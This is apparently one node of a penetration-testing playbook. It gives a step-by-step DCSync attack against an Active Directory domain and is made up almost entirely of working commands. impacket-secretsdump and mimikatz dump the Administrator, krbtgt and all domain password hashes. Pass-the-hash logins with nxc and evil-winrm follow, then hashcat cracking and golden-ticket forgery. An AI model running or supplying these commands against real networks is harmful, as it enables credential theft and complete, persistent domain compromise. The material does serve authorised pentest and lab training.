title: DCSync — Domain Owned
body: Abuse the AD replication right to make the DC hand you NT hashes - no code runs on the DC, no service installed. Quiet and total. REQUIRES an account that already holds replication rights (DA/EA or a BloodHound DCSync edge) - it is not a privesc. Step-by-step below.
cmd:
# ══════════════════════════════════════════════════════
# DCSYNC → replicate the directory, pull every hash incl. krbtgt
# ══════════════════════════════════════════════════════
# PREREQUISITE - you need an account WITH replication rights:
#   Domain/Enterprise Admins, Administrator, OR any principal granted
#   DS-Replication-Get-Changes(-All). BloodHound flags these as "DCSync"
#   edges. Running as a normal user just fails - confirm the edge first.

# -- STEP 1: Target ONE account first (confirms it works) -----
# Grab the Administrator hash (fast sanity check):
impacket-secretsdump -just-dc-user Administrator domain.com/dauser:'pass'@$dcip
# With an NT hash instead of a password (pass-the-hash):
impacket-secretsdump -just-dc-user Administrator domain.com/dauser@$dcip -hashes :NTHASH

# -- STEP 2: VERIFY the dump worked ---------------------------
# SUCCESS = a line like:
#   Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NT hash>:::
# "DRSR SessionError" / "ACCESS_DENIED" = your account has NO replication
# right. Stop - go confirm the DCSync edge in BloodHound.

# -- STEP 3: Pull the WHOLE domain ----------------------------
# Every user NT hash (NTLM only - fastest, cleanest):
impacket-secretsdump -just-dc-ntlm domain.com/dauser:'pass'@$dcip -outputfile domain_hashes
# Everything (NTLM + Kerberos keys + reversible cleartext):
impacket-secretsdump -just-dc domain.com/dauser:'pass'@$dcip -outputfile domain_hashes
# Writes: domain_hashes.ntds (hashes) / .kerberos / .cleartext

# -- STEP 4: Grab krbtgt - this is the prize ------------------
grep -i krbtgt domain_hashes.ntds
# krbtgt's NT hash forges GOLDEN TICKETS (auth as anyone, survives resets):
impacket-secretsdump -just-dc-user krbtgt domain.com/dauser:'pass'@$dcip

# -- STEP 5: USE what you pulled - the "now what" -------------
# Hashes are not the finish line. Convert to access:
#   A) PtH onto the DC as Administrator:
nxc smb $dcip -u Administrator -H <admin_NThash>
evil-winrm -i $dcip -u Administrator -H <admin_NThash>
#   B) Forge a golden ticket from krbtgt (survives password resets):
#      → see the golden_ticket node - feed it krbtgt hash + domain SID.
#   C) Crack the juicy hashes offline (mode 1000 = NTLM):
hashcat -m 1000 domain_hashes.ntds /usr/share/wordlists/rockyou.txt

# ══════════════════════════════════════════════════════
# WINDOWS / MIMIKATZ VARIANT (on-box, already SYSTEM/DA)
# ══════════════════════════════════════════════════════
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.com /user:Administrator" "exit"
# All users to CSV:
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.com /all /csv" "exit"

# ══════════════════════════════════════════════════════
# GOTCHAS
# ══════════════════════════════════════════════════════
# ACCESS_DENIED / DRSR SessionError = no replication right. DCSync is NOT a
#   privesc - you must already hold DA or a delegated DCSync edge.
# Kerberos-only context (-k -no-pass)? Use the HOSTNAME, not the IP - IP
#   forces NTLM and fails right after a golden/overpass (same as psexec).
# secretsdump replicating from a non-DC source is loud to EDR. Lab-fine;
#   on a real engagement note it and prefer single-user targeting.
warn: DCSync is NOT a privilege escalation - it REQUIRES an account that already holds replication rights (DA/EA or a BloodHound DCSync edge). ACCESS_DENIED means you don't have it. The krbtgt hash is the real prize: it forges golden tickets that survive password resets. After dumping, convert hashes to access (PtH to the DC / golden ticket) - the dump alone isn't the finish line.

choices.label: Got SPN hashes — forge silver tickets
Got krbtgt hash — golden tickets via lateral movement
No DCSync rights — pull NTDS via shadow copy
Domain Admin shell on DC — grab proof
